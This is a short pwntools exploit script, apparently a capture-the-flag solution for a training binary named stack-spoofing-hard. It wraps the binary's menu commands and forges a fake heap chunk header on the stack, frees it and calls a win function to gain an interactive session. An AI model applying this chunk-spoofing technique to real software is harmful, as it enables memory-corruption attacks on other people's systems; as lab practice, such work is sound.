#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/stack-spoofing-hard")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io


def control_flow():
    io = process()
    payload = b"a" * (0x40 - 0x10) + b"\x00" * 8 + p64(0x51) 
    io = stack_scanf(io,payload)
    io = stack_free(io)
    io = stack_malloc_win(io)
    io.interactive()


control_flow()
